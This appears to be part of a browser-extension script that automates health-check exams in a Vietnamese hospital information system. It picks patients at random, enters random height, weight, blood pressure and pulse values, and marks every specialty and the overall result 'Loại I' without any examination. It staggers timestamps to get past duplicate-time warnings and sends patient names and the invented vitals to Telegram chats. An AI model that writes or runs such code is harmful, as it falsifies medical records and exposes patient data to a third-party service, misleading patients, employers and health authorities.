                const timeStr = new Date().toLocaleTimeString('vi-VN', { hour12: false });
                
                const logItem = `
                    <div class="log-row">
                        <div class="log-time">[${timeStr}]</div>
                        <div class="log-msg">${colorMsg}</div>
                    </div>
                `;
                
                liveLog.insertAdjacentHTML('beforeend', logItem);
                
                while (liveLog.children.length > 150) {
                    liveLog.removeChild(liveLog.firstElementChild);
                }
                
                liveLog.scrollTop = liveLog.scrollHeight;
            }
            
            document.querySelector("#exam-cnt-success").textContent = STATE.successList.length;
            document.querySelector("#exam-cnt-failed").textContent = STATE.failedList.length;

            if (STATE.successList.length > 0) {
                paneSuccess.innerHTML = STATE.successList.map(item => `
                    <div style="border-bottom: 1px solid #e2e8f0; padding: 4px 0;">
                        <b>${item.ten}</b> <span style="color:#64748b">(C:${item.chieuCao}, N:${item.canNang})</span>
                    </div>
                `).join('');
            }
            if (STATE.failedList.length > 0) {
                paneFailed.innerHTML = STATE.failedList.map(item => `
                    <div style="border-bottom: 1px solid #e2e8f0; padding: 4px 0; color: #dc2626;">
                        <b>${item.ten}</b>: ${item.lyDoLoi}
                    </div>
                `).join('');
            }
        };

        document.querySelector("#his-exam-btn-copy-names").addEventListener("click", async () => {
            await copyPatientNamesToClipboard();
        });

        const floatingBtn = document.querySelector("#his-exam-floating-toggle-btn");
        const closeBtn = document.querySelector("#his-exam-btn-close-ui");
        const toggleModal = () => {
            if (modal.style.display === "none") {
                modal.style.display = "block";
                floatingBtn.style.display = "none";
            } else {
                modal.style.display = "none";
                floatingBtn.style.display = "flex";
            }
        };
        closeBtn.addEventListener("click", toggleModal);
        floatingBtn.addEventListener("click", toggleModal);

        let watchdogTimer;

        const btnStart = document.querySelector("#btn-start-ksk");
        const btnStop = document.querySelector("#btn-stop-ksk");

        btnStart.addEventListener("click", async () => {
            if (STATE.isRunning) return;
            STATE.isRunning = true;
            btnStart.style.display = "none";
            btnStop.style.display = "block";
            
            updateActivity();
            if (watchdogTimer) clearInterval(watchdogTimer);
            watchdogTimer = setInterval(() => {
                if (!STATE.isRunning) {
                    clearInterval(watchdogTimer);
                    toggleAlertMode(false);
                    return;
                }
                if (Date.now() - STATE.lastActivityTime > 40000) {
                    if (!STATE.isAlerting) {
                        toggleAlertMode(true);
                        updateLogUI("🆘 CẢNH BÁO: Hệ thống có vẻ bị kẹt quá lâu tại 1 bước! Đang cố gắng chờ hoặc reset...");
                        
                        const bsInfo = getDoctorInfo();
                        sendTelegramAlert(TELEGRAM_CHAT_ID_ERROR, `🆘 <b>CẢNH BÁO: HỆ THỐNG ĐANG BỊ ĐƠ/TREO!</b>\n👨‍⚕️ <b>Tài khoản:</b> ${bsInfo}\nTool khám sức khỏe đã đứng yên quá 40 giây không có phản hồi.\nVui lòng kiểm tra lại trình duyệt ngay lập tức.`);
                    }
                }
            }, 5000);

            const ccMin = parseInt(document.querySelector("#cfg-cc-min").value) || 150;
            const ccMax = parseInt(document.querySelector("#cfg-cc-max").value) || 180;
            const cnMin = parseInt(document.querySelector("#cfg-cn-min").value) || 45;
            const cnMax = parseInt(document.querySelector("#cfg-cn-max").value) || 70;
            const hacMin = parseInt(document.querySelector("#cfg-hac-min").value) || 110;
            const hacMax = parseInt(document.querySelector("#cfg-hac-max").value) || 130;
            const hatMin = parseInt(document.querySelector("#cfg-hat-min").value) || 70;
            const hatMax = parseInt(document.querySelector("#cfg-hat-max").value) || 80;
            const machMin = parseInt(document.querySelector("#cfg-mach-min").value) || 65;
            const machMax = parseInt(document.querySelector("#cfg-mach-max").value) || 90;

            let totalProcessed = 0;
            let previousKhamMinute = null;
            let isNoMorePatients = false;

            updateLogUI("🚀 Bắt đầu tiến trình khám tự động...");

            try {
                while (STATE.isRunning) {
                    updateActivity();
                    const refreshTimes = getRandom(2, 3);
                    updateLogUI(`▶️ Click nút 'Làm mới' danh sách (${refreshTimes} lần).`);
                    for (let i = 1; i <= refreshTimes; i++) {
                        const btnLamMoi = await waitForElement('#lammoi', 4000);
                        if (btnLamMoi) btnLamMoi.click();
                        await sleep(800);
                    }

                    let patientRows = Array.from(document.querySelectorAll('tr.jqgrow')).filter(row => row.offsetParent !== null);
                    if (patientRows.length === 0) {
                        updateLogUI("⚠️ Hết bệnh nhân trong danh sách! Đã tự động dừng.");
                        isNoMorePatients = true;
                        break;
                    }

                    const randomIndex = getRandom(0, patientRows.length - 1);
                    const targetRow = patientRows[randomIndex];
                    const nameCell = targetRow.querySelector('td[aria-describedby*="TEN_BENH_NHAN"]');
                    const patientName = nameCell ? nameCell.textContent.trim() : 'Chưa rõ tên';
                    const timeCell = targetRow.querySelector('td[aria-describedby*="TG_KHAM"], td[aria-describedby*="GIO_KHAM"]');
                    const currentExamTime = timeCell ? timeCell.textContent.trim() : '';

                    const caseStartTime = Date.now();
                    updateLogUI(`<span style="color:#0ea5e9;">================================</span>`);
                    updateLogUI(`👤 Đã chọn Bệnh nhân: <b style="color:#38bdf8;">${patientName}</b>`);
                    
                    const nowStart = new Date();
                    const startHourMinute = `${String(nowStart.getHours()).padStart(2, '0')}:${String(nowStart.getMinutes()).padStart(2, '0')}`;
                    const startMinuteValue = nowStart.getMinutes();

                    const bsInfoInit = getDoctorInfo();
                    const initialMsg = `⏳ <b>Chọn bệnh nhân:</b> ${patientName} (${startHourMinute})\n👨‍⚕️ <b>Bác sĩ:</b> ${bsInfoInit}\n🔄 <b>Trạng thái:</b> Đang khám...`;
                    const telegramMessageId = await sendTelegramMessage(TELEGRAM_CHAT_ID_SUCCESS, initialMsg);

                    updateLogUI(`▶️ Click vào dòng dữ liệu bệnh nhân...`);
                    targetRow.click();
                    await sleep(800);
                    updateActivity();

                    let currentRecord = {
                        stt: totalProcessed + 1, ten: patientName, gioKham: currentExamTime,
                        chieuCao: '', canNang: '', haCao: '', haThap: '', mach: '',
                        phanLoaiTL: '', chuyenKhoa: 'Loại I', phanLoaiTongQuat: '', thoiGian: '', lyDoLoi: ''
                    };

                    try {
                        if (previousKhamMinute !== null) {
                            const currentMinuteNow = new Date().getMinutes();
                            if (currentMinuteNow === previousKhamMinute) {
                                await waitUntilDifferentMinute(previousKhamMinute, updateLogUI);
                            }
                        }

                        let clickKhamSuccess = false;
                        let khamRetry = 0;

                        while (!clickKhamSuccess && STATE.isRunning) {
                            updateActivity();
                            khamRetry++;

                            const isStuck = await checkAndRecoverIfStuck(updateLogUI);
                            if (isStuck) { 
                                updateActivity(); 
                                throw new Error("RESTART_LOOP"); 
                            }

                            if (khamRetry > 4) throw new Error("Không thể click nút Khám (Đã thử 4 lần).");

                            updateLogUI(`▶️ Click nút 'Khám' (Lần thử: ${khamRetry})...`);
                            const btnKham = await waitForElement('#kham', 4000);
                            const isKhamDisabled = btnKham && (btnKham.disabled || btnKham.classList.contains('button_disabled'));
                            
                            if (btnKham && !isKhamDisabled) {
                                btnKham.click();
                                await sleep(1000);

                                previousKhamMinute = new Date().getMinutes();
                                const isDupError = await handleDuplicateTimeErrorPopup(updateLogUI);
                                if (isDupError) {
                                    await waitUntilDifferentMinute(previousKhamMinute, updateLogUI);
                                } else {
                                    updateLogUI(">> Load thành công form Khám Bệnh.");
                                    clickKhamSuccess = true;
                                }
                            } else {
                                await sleep(1000);
                            }
                        }

                        if (!STATE.isRunning) break;
                        updateActivity();

                        updateLogUI("▶️ Nhập mã bệnh ICD (z00.0) và nhấn nút Enter.");
                        await setICDAndPressEnter('#cmuicdVao', 'z00.0');

                        const isIcdWarnEarly = await handleWarningAndCancel(updateLogUI);
                        if (isIcdWarnEarly) throw new Error("WARNING_RESET");

                        updateLogUI("▶️ Click chọn mẫu: 'Khám sức khỏe >= 18 tuổi'.");
                        const btnKSK18 = await waitForElement('#khamsuckhoetheodoituongdu18', 4000);
                        if (btnKSK18) btnKSK18.click();
                        await sleep(1200);

                        const saveRes1 = await saveAndAcceptPopup(updateLogUI);
                        if (saveRes1 === 'WARNING_RESET') throw new Error("WARNING_RESET");
                        updateActivity();

                        updateLogUI("▶️ Click chuyển sang Tab 2 (Thể lực).");
                        await switchTabSafe('#tt32_mau2ksk_tab2', '#tt32_mau2chieucao');
                        
                        currentRecord.chieuCao = getRandom(ccMin, ccMax);
                        currentRecord.canNang = getRandom(cnMin, cnMax);
                        currentRecord.haCao = getRandom(hacMin, hacMax);
                        currentRecord.haThap = getRandom(hatMin, hatMax);
                        currentRecord.mach = getRandom(machMin, machMax);
                        currentRecord.phanLoaiTL = 'Loại I';

                        updateLogUI(`▶️ Điền Chiều cao: ${currentRecord.chieuCao} cm | Cân nặng: ${currentRecord.canNang} kg`);
                        await setValueSafe('#tt32_mau2chieucao', currentRecord.chieuCao);
                        await setValueSafe('#tt32_mau2cannang', currentRecord.canNang);
                        
                        updateLogUI(`▶️ Điền Huyết áp: ${currentRecord.haCao}/${currentRecord.haThap} | Mạch: ${currentRecord.mach} l/p`);
                        await setValueSafe('#tt32_mau2kskhuyetapcao', currentRecord.haCao);
                        await setValueSafe('#tt32_mau2kskhuyetapthap', currentRecord.haThap);
                        await setValueSafe('#tt32_mau2kskmach', currentRecord.mach);
                        
                        updateLogUI(`▶️ Điền Phân loại thể lực: '${currentRecord.phanLoaiTL}'`);
                        await setValueSafe('#tt32_mau2phanloaitheluc', currentRecord.phanLoaiTL);

                        const saveRes2 = await saveAndAcceptPopup(updateLogUI);
                        if (saveRes2 === 'WARNING_RESET') throw new Error("WARNING_RESET");
                        updateActivity();

                        updateLogUI("▶️ Click chuyển sang Tab 3 (Lâm sàng).");
                        await switchTabSafe('#tt32_mau2ksk_tab3', '#tt32_mau2tuanhoanphanloai');
                        const clinicalSelectIds = [
                            '#tt32_mau2tuanhoanphanloai', '#tt32_mau2hohapphanloai', '#tt32_mau2tieuhoaphanloai',
                            '#tt32_mau2thantietnieuphanloai', '#tt32_mau2noitietphanloai', '#tt32_mau2coxuongkhopphanloai',
                            '#tt32_mau2thankinhphanloai', '#tt32_mau2tamthanphanloai', '#tt32_mau2ngoaikhoaphanloai',
                            '#tt32_mau2ngkdalieuphanloai'
                        ];
                        
                        updateLogUI("▶️ Chọn 'Loại I' cho tất cả 10 chuyên khoa lâm sàng.");
                        for (const id of clinicalSelectIds) {
                            await setValueSafe(id, 'Loại I');
                        }
                        
                        const saveRes3 = await saveAndAcceptPopup(updateLogUI);
                        if (saveRes3 === 'WARNING_RESET') throw new Error("WARNING_RESET");
                        updateActivity();

                        updateLogUI("▶️ Click chuyển sang Tab 4 (Tổng kết).");
                        await switchTabSafe('#tt32_mau2ksk_tab4', '#tt32_mau2suckhoabinhthuong');
                        currentRecord.phanLoaiTongQuat = 'Loại I';
                        
                        updateLogUI(`▶️ Điền Phân loại sức khỏe chung: '${currentRecord.phanLoaiTongQuat}'`);
                        await setValueSafe('#tt32_mau2suckhoabinhthuong', currentRecord.phanLoaiTongQuat);
                        
                        const saveRes4 = await saveAndAcceptPopup(updateLogUI);
                        if (saveRes4 === 'WARNING_RESET') throw new Error("WARNING_RESET");
                        updateActivity();

                        await closeExamForm(updateLogUI);

                        updateLogUI("▶️ Click nút 'Lưu' (V-check) cuối cùng ở màn hình chính.");
                        const btnLuuCuoi = await waitForElement('#luu', 4000);
                        if (btnLuuCuoi) btnLuuCuoi.click();
                        await sleep(1000);
                        
                        const isWarnFinal = await handleWarningAndCancel(updateLogUI);
                        if (isWarnFinal) throw new Error("WARNING_RESET");

                        await handleDuplicateTimeErrorPopup(updateLogUI);

                        const nowEnd = new Date();
                        const endMinuteValue = nowEnd.getMinutes();
                        const endHourMinute = `${String(nowEnd.getHours()).padStart(2, '0')}:${String(nowEnd.getMinutes()).padStart(2, '0')}`;

                        if (startMinuteValue === endMinuteValue) {
                            const currentDocInfo = getDoctorInfo();
                            const duplicateWarningMsg = `${currentDocInfo} trùng giờ khám, vui lòng đợi.`;
                            await sendTelegramMessage(TELEGRAM_CHAT_ID_SUCCESS, duplicateWarningMsg);
                            updateLogUI(`⚠️ Phát hiện trùng phút (${startHourMinute} -> ${endHourMinute}), đã gửi cảnh báo Telegram.`);
                        }

                        totalProcessed++;
                        currentRecord.thoiGian = `${((Date.now() - caseStartTime) / 1000).toFixed(1)}s`;
                        STATE.successList.unshift(currentRecord);
                        
                        updateLogUI(`✅ Xong ca: ${patientName} (Mất ${currentRecord.thoiGian})`);
                        
                        const bsInfoFinal = getDoctorInfo();
                        const successUpdateMsg = `✅ <b>Chọn bệnh nhân:</b> ${patientName} (${startHourMinute} - ${endHourMinute})\n👨‍⚕️ <b>Bác sĩ:</b> ${bsInfoFinal}\n📌 <b>Trạng thái:</b> Đã khám\n⏱ <b>Thời gian:</b> ${currentRecord.thoiGian}\n🏷️ <b>Phân loại:</b> ${currentRecord.phanLoaiTongQuat}\n📊 <b>Chiều cao:</b> ${currentRecord.chieuCao} cm | <b>Cân nặng:</b> ${currentRecord.canNang} kg\n💓 <b>Huyết áp:</b> ${currentRecord.haCao}/${currentRecord.haThap} | <b>Mạch:</b> ${currentRecord.mach} l/p`;
                        
                        if (telegramMessageId) {
                            await editTelegramMessage(TELEGRAM_CHAT_ID_SUCCESS, telegramMessageId, successUpdateMsg);
                        } else {
                            await sendTelegramAlert(TELEGRAM_CHAT_ID_SUCCESS, successUpdateMsg);
                        }

                        updateActivity();
                        await sleep(1000);

                    } catch (err) {
                        updateActivity();
                        if (err.message === "RESTART_LOOP" || err.message === "WARNING_RESET") {
                            await closeExamForm(updateLogUI);
                            updateLogUI(`🔄 Ca bị cảnh báo. Bắt đầu quy trình làm mới danh sách...`);
                            
                            if (telegramMessageId) {
                                await editTelegramMessage(TELEGRAM_CHAT_ID_SUCCESS, telegramMessageId, `⚠️ <b>Chọn bệnh nhân:</b> ${patientName}\n❌ <b>Trạng thái:</b> Cảnh báo / Reset lại ca khám.`);
                            }

                            await sleep(1500);
                            continue; 
                        }

                        const isStuckAgain = await checkAndRecoverIfStuck(updateLogUI);
                        if (isStuckAgain) {
                            await closeExamForm(updateLogUI);
                            continue; 
                        }

                        currentRecord.lyDoLoi = err.message || "Lỗi giao diện";
                        STATE.failedList.unshift(currentRecord);
                        updateLogUI(`❌ Lỗi ca ${patientName}: ${err.message}`);
                        
                        const bsInfoErr = getDoctorInfo();
                        const errorMsg = `❌ <b>LỖI CA KHÁM!</b>\n👨‍⚕️ <b>Bác sĩ:</b> ${bsInfoErr}\n👤 <b>Bệnh nhân:</b> ${patientName}\n⚠️ <b>Lý do:</b> ${err.message}`;
                        await sendTelegramAlert(TELEGRAM_CHAT_ID_ERROR, errorMsg);

                        if (telegramMessageId) {
                            await editTelegramMessage(TELEGRAM_CHAT_ID_SUCCESS, telegramMessageId, `❌ <b>Chọn bệnh nhân:</b> ${patientName}\n⚠️ <b>Trạng thái:</b> Lỗi (Chi tiết xem tại nhóm @loi_khambenh)`);
                        }
                        
                        await closeExamForm(updateLogUI);
                        await sleep(1500);
                    }
                }
            } finally {
                STATE.isRunning = false;
                btnStart.style.display = "flex";
                btnStop.style.display = "none";
                clearInterval(watchdogTimer);
                toggleAlertMode(false);
                updateLogUI("⏹ Đã dừng tiến trình khám tự động.");

                if (isNoMorePatients) {
                    const bsSummaryInfo = getDoctorInfo();
                    const successCount = STATE.successList.length;
                    const failedCount = STATE.failedList.length;
                    const summaryMsg = `${bsSummaryInfo} Khám thành công: ${successCount} người, Thất bại ${failedCount} người.`;
                    await sendTelegramAlert(TELEGRAM_CHAT_ID_SUCCESS, summaryMsg);
                    updateLogUI(`📊 Đã gửi thông báo tổng kết hoàn thành danh sách về Telegram.`);
                }
            }
        });

        btnStop.addEventListener("click", () => {
            STATE.isRunning = false;
            clearInterval(watchdogTimer);
            toggleAlertMode(false);
        });
    };

    const ensureUIPersistence = () => {
        if (checkConditionsAndToggle() && !document.querySelector("#his-exam-form-modal")) {
            createUIModal();
        }
    };

    const observer = new MutationObserver(() => { ensureUIPersistence(); });
    observer.observe(document.body, { childList: true, subtree: true });

    chrome.runtime.onMessage.addListener((request) => {
        if (request.action === "TOGGLE_HIS_EXAM_MODAL") {
            if (!checkConditionsAndToggle()) {
                alert("Extension chỉ hoạt động tại trang Khám bệnh của HIS!");
                return;
            }
            const modal = document.querySelector("#his-exam-form-modal");
            const floatingBtn = document.querySelector("#his-exam-floating-toggle-btn");
            if (modal) {
                if (modal.style.display === "none") {
                    modal.style.display = "block";
                    if (floatingBtn) floatingBtn.style.display = "none";
                } else {
                    modal.style.display = "none";
                    if (floatingBtn) floatingBtn.style.display = "flex";
                }
            } else {
                createUIModal();
            }
        }
    });

    ensureUIPersistence();
})();